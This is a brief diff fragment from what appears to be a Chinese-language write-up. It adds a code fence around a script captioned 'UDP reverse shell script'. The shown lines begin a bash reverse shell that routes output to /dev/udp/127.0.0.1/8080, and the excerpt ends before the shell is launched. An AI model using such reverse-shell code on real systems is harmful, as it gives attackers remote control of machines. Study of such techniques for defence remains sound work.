@@ -60,6 +60,7 @@ if __name__ == '__main__':
 
 
 另附udp反弹shell脚本：
+```
 #!/bin/bash 
 exec 3>/dev/udp/127.0.0.1/8080
 exec 2>&3 
